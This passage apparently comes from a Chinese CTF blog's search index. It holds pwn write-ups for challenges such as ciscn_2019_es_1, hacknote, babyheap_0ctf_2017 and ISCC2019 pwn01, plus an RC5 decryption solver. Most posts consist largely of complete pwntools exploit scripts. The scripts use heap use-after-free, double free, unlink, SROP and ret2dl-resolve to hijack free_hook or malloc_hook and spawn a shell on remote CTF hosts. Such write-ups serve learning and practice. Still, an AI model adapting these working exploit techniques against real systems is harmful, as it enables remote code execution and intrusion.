system=freehook-libc.sym[&apos;__free_hook&apos;]+libc.sym[&apos;system&apos;] log.success(&quot;system: &quot;+hex(system)) add(10,0x30,&apos;10&apos;) delete(10) delete(10) add(11,0x30,p64(freehook)) add(12,0x30,&apos;12&apos;) add(13,0x30,p64(system)) delete(0) #gdb.attach(sh) sh.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_1","slug":"ciscn-2019-es-1","date":"2019-08-05T17:55:03.000Z","updated":"2019-08-06T00:45:19.717Z","comments":true,"path":"2019/08/06/ciscn-2019-es-1/","link":"","permalink":"http://yoursite.com/2019/08/06/ciscn-2019-es-1/","excerpt":"提示说是libc2.29，但是好像上错libc版本了。","text":"提示说是libc2.29，但是好像上错libc版本了。 简单分析12341.Add a 996 info2.Show info3.Call that 996 compary!4.I hate 996! 每次add会malloc(0x18)来创建一个chunk记录信息，其结构为： 123 name ----------&gt; content chunksize | call call call即free，free（*name），没有置零，存在UAF。 利用思路ubuntu18.04本地先把tcache填满，然后利用UAF，show出unsortbin中的main_arena地址，获取libc地址。 再double free，改写tcache的fd指针至free_hook，再次malloc控制free_hook，写上system，free一块内容为/bin/sh的chunk获取shell。 BUU remote直接利用UAF，show出unsortbin中的main_arena地址，获取libc地址。再double free，改写fastbin的fd指针至malloc_hook-0x23，再次malloc控制malloc_hook，写上onegadget，执行获取shell。 //不知道是不是BUU上面所有题都无视题目本身用了给的那两个libc，如果是这样的话感觉做题不是很方便啊。 libc2.29好像2.29里tcache就完全不能double free了，会遍历tcache，但是leak还是先填满tcache然后leak。double free就用fastbin，改写fastbin的fd指针至malloc_hook-0x23，再次malloc控制malloc_hook，写上onegadget，执行获取shell。 //纯猜测，没有2.29环境 EXPubuntu18.04本地1#coding=UTF-8 from pwn import * sh=process(&quot;./ciscn_2019_es_1.dms&quot;) #sh=remote(&quot;f.buuoj.cn&quot;,20173) def add(size,name,call): sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;\\n&quot;,str(int(size))) sh.sendafter(&quot;\\n&quot;,name) sh.sendafter(&quot;\\n&quot;,call) def show(index): sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;) sh.sendlineafter(&quot;\\n&quot;,str(index)) def delete(index): sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;\\n&quot;,str(index)) add(0x80,&quot;tcache&quot;,&quot;tcache&quot;) #index0 add(0x80,&quot;/bin/sh\\x00&quot;,&quot;/bin/sh\\x00&quot;) #index1 for i in range(8): delete(0) show(0) sh.recvuntil(&quot;name:\\n&quot;) leak=u64(sh.recv(6).ljust(8,&quot;\\x00&quot;)) main_arena=leak-96 log.success(&quot;main_arena: &quot;+hex(main_arena)) free_hook=main_arena+7336 log.success(&quot;free_hook: &quot;+hex(free_hook)) system=main_arena-0x39c800 log.success(&quot;system: &quot;+hex(system)) add(0x90,&quot;2&quot;,&quot;2&quot;) #index2 delete(2) delete(2) add(0x90,p64(free_hook),&quot;call&quot;) add(0x90,p64(free_hook),&quot;call&quot;) add(0x90,p64(system),&quot;call&quot;) delete(1) sh.interactive() BUU remote1#coding=UTF-8 from pwn import * from LibcSearcher import * #sh=process(&quot;./ciscn_2019_es_1.dms&quot;) onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] sh=remote(&quot;f.buuoj.cn&quot;,20173) def add(size,name): sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;\\n&quot;,str(int(size))) sh.sendafter(&quot;\\n&quot;,name) sh.sendafter(&quot;\\n&quot;,&quot;call&quot;) def show(index): sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;) sh.sendlineafter(&quot;\\n&quot;,str(index)) def delete(index): sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;\\n&quot;,str(index)) add(0x80,&quot;/bin/sh\\x00&quot;) #index0 add(0x80,&quot;/bin/sh\\x00&quot;) #index1 delete(0) show(0) sh.recvuntil(&quot;name:\\n&quot;) leak=u64(sh.recv(6).ljust(8,&quot;\\x00&quot;)) main_arena=leak-88 log.success(&quot;main_arena: &quot;+hex(main_arena)) malloc_hook=main_arena-0x10 log.success(&quot;malloc_hook: &quot;+hex(malloc_hook)) libcbase=main_arena-0x3C4B20 add(0x60,&quot;2&quot;) add(0x60,&quot;3&quot;) delete(2) delete(3) delete(2) add(0x60,p64(malloc_hook-0x23))#index4 add(0x60,&quot;5&quot;) add(0x60,&quot;6&quot;) add(0x60,&quot;a&quot;*19+p64(libcbase+onegadget[2])) delete(5) delete(5) sh.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_4","slug":"ciscn-2019-es-4","date":"2019-08-02T16:57:14.000Z","updated":"2019-08-02T18:30:14.705Z","comments":true,"path":"2019/08/03/ciscn-2019-es-4/","link":"","permalink":"http://yoursite.com/2019/08/03/ciscn-2019-es-4/","excerpt":"offbynull+unlink","text":"offbynull+unlink 程序分析12341.malloc2.free3.edit4.show malloc时限制了index为0~32，size为128~256，并且会给出每个堆的堆地址（没有用到感觉可能思路出错了），heap数组记录每个堆的堆地址。edit正常情况下最多可以用两次，key1变量记录edit次数，show正常情况下不能使用，key2变量初始为0，改成1就可以使用了。 heap，key1，key2都在bss段上。 漏洞点在edit里： 1234567891011v3 = __readfsqword(0x28u); if ( key1 == 2 ) exit(0); puts(&quot;index:&quot;); v2 = read_int(&quot;index:&quot;); if ( v2 &lt; 0 || v2 &gt; 32 || !heap[v2] ) exit(0); puts(&quot;content:&quot;); v0 = heap[v2]; v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0; ++key1; 这里产生了offbynull。 利用思路构造unlink，使得heap[32]=&amp;heap[29]，然后使用edit，修改heap[32]=puts.got，同时修改key1和key2，让我们可以使用show并且解除edit的次数限制，之后show leak出libc版本，改写free_hook为system,free一个内容为/bin/sh的chunk获取shell。 我的exp中主要利用heap[31]和heap[32]，unlink成功后第一次edit时，也顺便修改heap[31]=&amp;heap[31]，这样获取free_hook地址后，再利用edit让heap[31]=free_hook，最后再次edit，修改free_hook为system。 EXP1#!/usr/bin/env python from pwn import * from LibcSearcher import * #sh=process(&quot;./ciscn_2019_es_4.dms&quot;) elf=ELF(&quot;./ciscn_2019_es_4.dms&quot;) context.arch=&apos;amd64&apos; sh=remote(&quot;f.buuoj.cn&quot;,20176) heap=0x6020E0 key2=0x6022B8 #show key1=0x6022BC #edit def malloc(index,size,content): sh.sendlineafter(&quot;4.show\\n&quot;,&quot;1&quot;) sh.sendlineafter(&quot;index:\\n&quot;,str(index)) sh.sendlineafter(&quot;size:\\n&quot;,str(int(size))) sh.sendafter(&quot;content:\\n&quot;,content) def free(index): sh.sendlineafter(&quot;4.show\\n&quot;,&quot;2&quot;) sh.sendlineafter(&quot;index:\\n&quot;,str(index)) def edit(index,content): sh.sendlineafter(&quot;4.show\\n&quot;,&quot;3&quot;) sh.sendlineafter(&quot;index:\\n&quot;,str(index)) sh.sendafter(&quot;content:\\n&quot;,content) def show(index): sh.sendlineafter(&quot;4.show\\n&quot;,&quot;4&quot;) sh.sendlineafter(&quot;index:\\n&quot;,str(index)) malloc(32,0xf8,&apos;32&apos;) malloc(1,0xf0,&apos;1&apos;) malloc(2,0x80,&apos;/bin/sh\\x00&apos;) malloc(31,0x80,&apos;31&apos;) edit(32,p64(0)+p64(0xf1)+p64(heap+32*8-0x18)+p64(heap+32*8-0x10)+p64(0)*26+p64(0xf0)) free(1) edit(32,p64(0)*2+p64(0x6020E0+32*8-8)+p64(elf.got[&apos;puts&apos;])+p64(0)*26+p32(1)+p32(0xffffffee)) show(32) puts=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) log.success(&quot;puts: &quot;+hex(puts)) libc=LibcSearcher(&quot;puts&quot;,puts) libcbase=puts-libc.dump(&apos;puts&apos;) free_hook=libcbase+libc.dump(&apos;__free_hook&apos;) system=libcbase+libc.dump(&apos;system&apos;) edit(31,p64(free_hook)) edit(31,p64(system)) free(2) #gdb.attach(sh) sh.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_7","slug":"ciscn-2019-es-7","date":"2019-08-02T15:10:37.000Z","updated":"2019-08-02T16:23:24.321Z","comments":true,"path":"2019/08/02/ciscn-2019-es-7/","link":"","permalink":"http://yoursite.com/2019/08/02/ciscn-2019-es-7/","excerpt":"SROP，甚至比CTFWIKI上的例题简单。","text":"SROP，甚至比CTFWIKI上的例题简单。 程序分析12345678910111213push rbpmov rbp, rspxor rax, raxmov edx, 400h ; countlea rsi, [rsp+buf] ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_readmov rax, 1mov edx, 30h ; countlea rsi, [rsp+buf] ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_writeretn 调用syscall read&amp;write，之后直接retn。 同时给了两个gadget，方便修改rax为相应的系统调用号。 1234mov rax, 0Fh //constants.SYS_sigreturnretn mov rax, 3Bh //constants.SYS_execveretn CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。也可以直接手动找gadgets把参数传好，然后利用mov rax, 3Bh syscall执行execve(“/bin/sh”,0,0)，不过感觉找gadgets比上CTFWIKI麻烦2333 EXP1#!/usr/bin/env python from pwn import * from LibcSearcher import * #sh=process(&quot;./ciscn_2019_es_7.dms&quot;) context.arch=&apos;amd64&apos; sh=remote(&quot;f.buuoj.cn&quot;,20179) syscall_ret=0x400517 read=0x4004f1 movrax_sigreturn=0x4004da movrax_system=0x4004E2 sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(read)) sh.recv(32) stack_addr=u64(sh.recv(8)) log.success(&quot;stack: &quot;+hex(stack_addr)) sh.recv(8) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr - 280 # &quot;/bin/sh&quot; &apos;s addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe)) sh.interactive()","categories":[],"tags":[]},{"title":"攻防世界-hacknote","slug":"hacknote","date":"2019-07-31T18:41:10.000Z","updated":"2019-08-07T14:46:38.729Z","comments":true,"path":"2019/08/01/hacknote/","link":"","permalink":"http://yoursite.com/2019/08/01/hacknote/","excerpt":"感觉BUU有些写不动又回来刷攻防世界的一些简单题了2333","text":"感觉BUU有些写不动又回来刷攻防世界的一些简单题了2333 程序功能11. Add note 2. Delete note 3. Print note 4. Exit 每次Add都会malloc(0x8)，其中fd用来存放一个自定义的puts函数，会打印出*bk，然后再malloc(输入的size)作为记录内容的chunk，将返回的地址存入bk。 程序漏洞Delete后没有置零，存在UAF，Print时调用fd位置的函数。 漏洞利用1234Add(0x10,&apos;0&apos;)Add(0x10,&apos;1&apos;)Del(0)Del(1) 此时fastbin中会用两个单链表记录空闲的chunk，两个大小为0x10的chunk（malloc(0x8)时得到的chunk）会被记录在一个链表中。 12Add(0x8,p32(0x804862b)+p32(0x804A024))#0x804862b为自定义的puts函数的地址 Print(0) leak=u32(sh.recv(4)) log.success(&quot;puts: &quot;+hex(leak)) puts=leak libc=LibcSearcher(&apos;puts&apos;,puts) libcbase=leak-libc.dump(&apos;puts&apos;) 再次Add(0x8)，此时得到的存放内容的chunk就是chunk0的malloc(0x8)的chunk，并且由于UAF，此时Print(0)还可以使用，修改chunk2的内容，改变chunk0的bk部分为puts_got，再Print(0)即可leak出libc地址。这里攻防世界给的libc好像给错了，自己找了一下libc才对得上。 1Del(2) Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;) Print(0) sh.interactive() 然后把chunk2删除再次申请，又可以再次修改chunk0。这次将函数指针改成system地址，Print(0)时即会执行system(fd)，但是fd上存放的就是system地址，这里学习了一手||。在bk位置写上’||sh’，执行的就是system(systemaddr||sh)，可以获取shell。 EXP1#!/usr/bin/env python from pwn import * from LibcSearcher import * #sh=process(&quot;./hacknote.dms&quot;) libc2=ELF(&quot;./libc-2.23.so&quot;) #onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] sh=remote(&apos;111.198.29.45&apos;,41371) def Add(size,content): sh.sendlineafter(&apos;choice :&apos;,&apos;1&apos;) sh.sendlineafter(&apos;size :&apos;,str(int(size))) sh.sendlineafter(&apos;Content :&apos;,content) def Del(Index): sh.sendlineafter(&apos;choice :&apos;,&apos;2&apos;) sh.sendlineafter(&apos;Index :&apos;,str(Index)) def Print(Index): sh.sendlineafter(&apos;choice :&apos;,&apos;3&apos;) sh.sendlineafter(&apos;Index :&apos;,str(Index)) Add(0x10,&apos;0&apos;) Add(0x10,&apos;1&apos;) Del(0) Del(1) Add(0x8,p32(0x804862b)+p32(0x804A024)) Print(0) leak=u32(sh.recv(4)) log.success(&quot;puts: &quot;+hex(leak)) puts=leak libc=LibcSearcher(&apos;puts&apos;,puts) libcbase=leak-libc.dump(&apos;puts&apos;) Del(2) Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;) Print(0) sh.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_emachine","slug":"ciscn-2019-c-1","date":"2019-07-30T04:52:30.000Z","updated":"2019-07-30T05:31:58.125Z","comments":true,"path":"2019/07/30/ciscn-2019-c-1/","link":"","permalink":"http://yoursite.com/2019/07/30/ciscn-2019-c-1/","excerpt":"说起来这题算是国赛过程中自己做的唯一一题2333，tcl","text":"说起来这题算是国赛过程中自己做的唯一一题2333，tcl 程序功能121.Encrypt2.Decrypt 其实只有一个功能Encrypt，Decrypt需要自己手动操作。 程序漏洞Encrypt中存在栈溢出 漏洞利用Encrypt会对输入进行加密，所以要让输入被加密后构成有效的ROP。 之前被加密过位置的就不会再被加密。例如第一次输入了a，加密后变成l，第二次输入aa，就只有第二个a会被加密，加密后变成al。 main函数地址为0x400b28，若输入为0x4e0b28，加密后恰好能变成main函数地址。用这个输入多填充几个地址，确保之后构造ROP时不会被加密。 比赛时没给libc，但差别不大，这次就按有libc来做了。 EXP1#coding=UTF-8 from pwn import * sh=remote(&quot;buuoj.cn&quot;,20115) #sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;,env=&#123;&quot;LD_PRELOAD&quot;:&apos;./x64_libc.so.6&apos;&#125;) elf=ELF(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;) libc=ELF(&apos;./x64_libc.so.6&apos;) def send(content): sh.recvuntil(&quot;Input your choice!\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;) sh.sendline(content) main=0x400B28 main_enc=0x4e0b28 pop_rdi=0x400c83 send(&apos;a&apos;*0x58+p64(main_enc)*10) send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.plt[&apos;puts&apos;])+p64(main)) sh.recvuntil(&apos;@\\n&apos;) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) libc_base=leak-libc.sym[&apos;puts&apos;] log.success(&quot;libcbase: &quot;+hex(libc_base)) send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(libc_base+0x18cd57)+p64(libc_base+libc.sym[&apos;system&apos;])) sh.interactive()","categories":[],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2019-07-29T14:31:21.000Z","updated":"2019-07-29T14:51:38.994Z","comments":true,"path":"2019/07/29/babyheap-0ctf-2017/","link":"","permalink":"http://yoursite.com/2019/07/29/babyheap-0ctf-2017/","excerpt":"回家之后这么热居然感冒了，在床上躺了一天Orz","text":"回家之后这么热居然感冒了，在床上躺了一天Orz 程序功能12341.alloc2.fill3.free4.dump 在alloc时，程序会分配大小为24个字节的存储结构： 123inuse 记录该chunk是否处于使用状态size 记录该chunk大小*ptr 记录alloc出的chunk的地址 程序漏洞在fill时，读入的size并非alloc记录的size，而是另外输入，因此产生了堆溢出。 漏洞利用申请四块chunk。 1Add(0x10) Add(0x10) Add(0x80) Add(0x10) 修改第二块chunk的size为0x40，并修改第三块chunk的size，标记上一块chunk处于使用状态。Free第二块chunk后申请大小为0x30的chunk，第三块chunk的head部分与fd，bk被包含进第二块chunk的content部分。 12Fill(0,0x20,p64(0)*3+p64(0x41)) Fill(2,0x20,p64(0)*3+p64(0x71))Free(1) Add(0x30） Free第三块chunk，其fd，bk为main_arena+88，dump第二块chunk得到此地址，leak出libc基址。由于分配chunk时使用的是calloc，第三块chunk的head在第二次申请第二块chunk时被置零，需要先修复才能Free。 12Fill(1,0x20,p64(0)*3+p64(0x91)) Free(2) Dump(1)Dump(1) sh.recvuntil(&apos;\\x91&apos;+&apos;\\x00&apos;*7) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) malloc_hook=leak-88-0x10 print hex(malloc_hook) libc_base=leak-0x3C4B20-88 one_gadget=libc_base+onegadget[1] fakefd=malloc_hook-0x23 之后在malloc_hook上方错位构造大小为0x7f的chunk，通过Fastbin attack获取该chunk，修改malloc_hook。 EXP1#coding=UTF-8 from pwn import * sh=remote(&quot;buuoj.cn&quot;,20001) #sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/babyheap_0ctf_2017.dms&apos;,env=&#123;&quot;LD_load&quot;:&apos;./x64_libc.so.6&apos;&#125;) libc=ELF(&quot;./x64_libc.so.6&quot;) onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] def Add(Size): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) def Fill(Index,Size,Content): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) sh.recvuntil(&quot;Content: &quot;) sh.send(Content) def Free(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) def Dump(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) Add(0x10) Add(0x10) Add(0x80) Add(0x10) Fill(0,0x20,p64(0)*3+p64(0x41)) Fill(2,0x20,p64(0)*3+p64(0x71)) Free(1) Add(0x30) Fill(1,0x20,p64(0)*3+p64(0x91)) Free(2) Dump(1) sh.recvuntil(&apos;\\x91&apos;+&apos;\\x00&apos;*7) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) malloc_hook=leak-88-0x10 print hex(malloc_hook) libc_base=leak-0x3C4B20-88 one_gadget=libc_base+onegadget[1] fakefd=malloc_hook-0x23 Add(0x60) Free(2) Fill(1,0x28,p64(0)*3+p64(0x71)+p64(fakefd)) Add(0x60) Add(0x60) Fill(4,0x13+8,&apos;a&apos;*0x13+p64(one_gadget)) Add(0x10) sh.interactive()","categories":[],"tags":[]},{"title":"安恒杯2019年5月月赛","slug":"安恒杯2019年5月月赛","date":"2019-05-30T08:46:40.000Z","updated":"2019-06-09T12:46:43.755Z","comments":true,"path":"2019/05/30/安恒杯2019年5月月赛/","link":"","permalink":"http://yoursite.com/2019/05/30/安恒杯2019年5月月赛/","excerpt":"西湖论剑线下赛复现专场","text":"西湖论剑线下赛复现专场 easycrack简单的替换，也可以在strcmp下断，调试得到flag。 Testre2得到flag之后才知道是RC5，逆的过程中只觉得中间加密部分的逻辑和骑驴师傅出的考核题差不多2333 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;int main()&#123; unsigned int key[26]=&#123;0&#125;; key[0]=0xb7e15163; for(int i=1;i&lt;26;i++) key[i]=key[i-1]-0x61c88647; unsigned int a1[4]=&#123;0x243F6A88,0x85A308D3,0x452821E6,0x38D01377&#125;; unsigned int v5=0,v6=0,v7=0; for(int i=0;i&lt;78;i++) &#123; key[i%26]=( (key[i%26]+v5+v6)&lt;&lt;(3&amp;0x1f) ) | ( (key[i%26]+v5+v6)&gt;&gt;(32-(3&amp;0x1f)) ); v5=key[i%26]; a1[i&amp;3]=( (a1[i&amp;3]+v5+v6)&lt;&lt;((v5+v6)&amp;0x1f) ) | ( (a1[i&amp;3]+v5+v6)&gt;&gt;(32-((v5+v6)&amp;0x1f)) ); v6=a1[i&amp;3]; &#125; unsigned int final[4]=&#123;0xF4A956BF,0xBA568F3D,0xD73A7F7C,0x817F532B&#125;; //unsigned int final[4]=&#123;0X6EA91D54,0X7C5153BA,0X339AABC3,0X6672A3A9&#125;; unsigned int input[4]=&#123;0x30303030,0x30303030,0x30303030,0x30303030&#125;; //encrypt /*for(int j=0;j&lt;=3;j+=2) &#123; v6=key[0]+input[j]; v7=key[1]+input[j+1]; for(int k=0;k&lt;=11;++k) &#123; v6=(( (v6^v7 )&lt;&lt;(v7&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v7&amp;0x1f)) ) )+key[2*j]; v7=(( (v6^v7 )&lt;&lt;(v6&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v6&amp;0x1f)) ) )+key[2*j+1]; &#125; input[j]=v6; input[j+1]=v7; &#125;*/ //decrypt for(int j=0;j&lt;=3;j+=2) &#123; v6=final[j]; v7=final[j+1]; for(int k=0;k&lt;=11;++k) &#123; v7=( ( ( ((v7-key[2*j+1])&gt;&gt;(v6&amp;0x1f) ) ) |( (v7-key[2*j+1])&lt;&lt; (32-(v6&amp;0x1f) ) ) ) )^v6; v6=( ( ( ((v6-key[2*j])&gt;&gt;(v7&amp;0x1f) ) ) |( (v6-key[2*j])&lt;&lt; (32-(v7&amp;0x1f) ) ) ) )^v7; &#125; input[j]=v6-key[0]; input[j+1]=v7-key[1]; &#125; unsigned char flag[16]=&#123;0&#125;; memcpy(flag,input,16); for(int i=0;i&lt;16;i++) printf(&quot;%c&quot;,flag[i]);&#125; 需要注意的就是运算符的优先级，我记得不是很清楚，所以只能为了运算顺序正确，使用了大量括号orz","categories":[],"tags":[]},{"title":"ISCC2019-pwn01","slug":"ISCC2019-pwn01","date":"2019-05-19T14:13:04.000Z","updated":"2019-05-19T14:35:23.517Z","comments":true,"path":"2019/05/19/ISCC2019-pwn01/","link":"","permalink":"http://yoursite.com/2019/05/19/ISCC2019-pwn01/","excerpt":"ret2-dl-runtime-resolve","text":"ret2-dl-runtime-resolve 简单分析1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char dest; // [esp+0h] [ebp-16h] size_t n; // [esp+Ah] [ebp-Ch] int *v6; // [esp+Eh] [ebp-8h] v6 = &amp;argc; n = read(0, &amp;buf, 0xF4240u); memcpy(&amp;dest, &amp;buf, n); return 0;&#125; 是很标准的ret2-dl-runtime-resolve例题了，需要注意的是需要看汇编： 123456.text:080484AE lea esp, [ebp-8].text:080484B1 pop ecx.text:080484B2 pop ebx.text:080484B3 pop ebp.text:080484B4 lea esp, [ecx-4].text:080484B7 retn 函数结尾处的汇编是这样的，意味着不能简单地填充溢出，和之前那道DDCTF的pwn一样，需要在特定位置输入正确的值才可以。 不过这一题不一样的是，我们可以直接控制ebp,esp到buf上，然后buf上的数据是受我们输入控制的，再配合一些gadgets就可以完成调用read函数并且换栈。 1sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret)) 像这样就可以把栈换到stage处，接下来就是标准的ret2-dl-runtime-resolve，详细地原理介绍看CTF-WIKI就可以了。 EXP1# coding=UTF-8 from pwn import * #sh=process(&quot;./pwn01.dms&quot;) sh=remote(&quot;39.100.87.24&quot;,8101) elf=ELF(&apos;./pwn01.dms&apos;) bss=elf.bss() read_plt=elf.plt[&apos;read&apos;] buf=bss+0x20 stage=buf+0x282 #stage=buf+28 pop_ret=0x0804851b ppp_ret=0x08048519 leave_ret=0x080483c5 #gdb.attach(sh) sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret)) #sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+32)+p32(0)+p32(buf+28)+&apos;aa&apos;+payload2) plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr index_offset = stage + 28 - rel_plt read_got = elf.got[&apos;read&apos;] read_index = (elf.plt[&apos;read&apos;] - plt0) / 16 - 1 read_index *= 8 r_offset=0x0804a00c fake_sym_addr = stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) / 0x10 st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat([st_name, 0, 0, 0x12]) r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_write_reloc = flat([read_got, r_info]) payload=&apos;aaaa&apos;+p32(plt0)+p32(index_offset)+&apos;aaaa&apos;+p32(stage+84)+&apos;aaaa&apos;+&apos;aaaa&apos;+fake_write_reloc+&apos;a&apos;*align+fake_write_sym+&apos;system\\x00&apos; payload+=&apos;a&apos;*(84-len(payload)) payload+=&apos;sh\\x00&apos; sh.send(payload) #sh.send(payload2) sh.interactive() 基本照抄CTF-WIKI，有的偏移和CTF-WIKI不一样，是因为换栈的方式不一样，我的EXP在第二次使用read函数时，开头四个字符需要输入一个填充，来让leave,ret中pop,ebp时pop，这样后面所有的伪造的结构的地址都要+4。 这题写了很久很久……主要是因为卡在了换栈的位置选择，我之前一直选择bss+400的位置，结果在调用dl_fixup时一直会报错，以为是换栈之类的出了问题，试了很久都不知道为啥，最终要感谢看雪论坛师傅mengllong的评论解救了我： 最后尝试了一下，至少要在bss+0x2a2的位置才不会出错2333","categories":[],"tags":[]},{"title":"DDCTF2019-pwn","slug":"DDCTF2019-pwn","date":"2019-05-16T14:30:32.000Z","updated":"2019-05-17T14:10:43.674Z","comments":true,"path":"2019/05/16/DDCTF2019-pwn/","link":"","permalink":"http://yoursite.com/2019/05/16/DDCTF2019-pwn/","excerpt":"自己补一下栈","text":"自己补一下栈 EXP1from pwn import * sh=process(&quot;./xpwn&quot;) libc=ELF(&quot;./libc.so.6&quot;) sh.recvuntil(&apos;Enter username: &apos;) sh.send(&apos;a&apos;*4*15) sh.recvuntil(&apos;a&apos;*4*15) setbuf=u32(sh.recv(4)) sh.recv(8) ebp=u32(sh.recv(4)) libcbase=setbuf-libc.symbols[&apos;setbuf&apos;] print hex(libcbase) sh.recvuntil(&apos;Please set the length of password: &apos;) sh.sendline(&apos;-1&apos;) sh.recvuntil(&apos;Enter password(lenth 4294967295): &apos;) sh.send(&apos;a&apos;*4*17+p32(ebp-8+0x20)+&apos;a&apos;*4*6+p32(libcbase+libc.symbols[&apos;system&apos;])+p32(0xdeadbeef)+p32(libcbase+libc.search(&apos;/bin/sh&apos;).next())) sh.interactive() 当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来。 TCLlibc文件用本地的就行了，看来本地运行的libc和给的libc不一样… libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)","categories":[],"tags":[]},{"title":"某awd的唯一pwn","slug":"某awd的唯一pwn","date":"2019-05-13T08:17:28.000Z","updated":"2019-08-08T17:47:11.412Z","comments":true,"path":"2019/05/13/某awd的唯一pwn/","link":"","permalink":"http://yoursite.com/2019/05/13/某awd的唯一pwn/","excerpt":"The article has been encrypted, please enter your password to view.","text":"Please enter the password to read the blog. Incorrect Password! No content to display! U2FsdGVkX19kTJXv0SlhE4Fr3oxCq6gul7XFSvyLEnN/hgC6l7zK28qFyr3t+27fqfwdBCEVEWzdgsgAIDnxoZhHQ1UArgVSWBbl1c8559XksO2izHX0FPjMrlTU9b9XafsUN5N4PuZ11hmYc6sAzIjvQRTX1+lHa9Ul3lbj760LRf2cOE8ccC5FSuFK+pLnKgIkL20HwiQQCfQfzDAp/Yf96c1rA3WVzSYkbEk1p3j8bWmXjwG8JkYo990uniYwT7Gq+jbM3SVSugkkvUiiOvVfl+jzdbfhyCx+6YBRGDZydxC6HMuXkEeRux2+ahj/DcdoTc3aACGJrypJZlVMwU+e3JB4VSj+sxEm1W1e7hcbXbbM8R8lHWpcpJX/KRAX15A5v6UFDw517/ynQBVdvDCipossHaHPAxqlt7S0N6LFH0mr0MoKTng9aG6sq4ZGmIXAI97PGKxadlsCg+l98T8dgulaWxFIqvodHl4G0rFGH40yTYafOtTvBCmVmOGmbGfPC6Sy+cYz4xjh7CjgJaMjkOnO44ioWXnXKi0uPzAjldNKDCv1SHaf4nJxwH5B/IyP8672bjnqGJUFahKj8bslY9ON3bRBe0ihPdBBVe+bTWc0qgIY24IqFP3+OtL+ItaM1nkj/NVO0N5opjnTwryNz159UZHY1hDI3ShreY7JKy5gqqedBaKd5ni9i0L5j1ZeY0W4w+zhxkgS7j6pgEQwX4wdvV2HVs8OH8JxD6ZwGjUiJvX8Ynr2j7CrmQuGB2yyiKGjcvC/dwjkFpTZERB2OPeMtxxWwQMRhdSCgNLdUkdCgabmQuYjrcJqEEnkqMHE1NmGROO56GLvWDFZwJbTY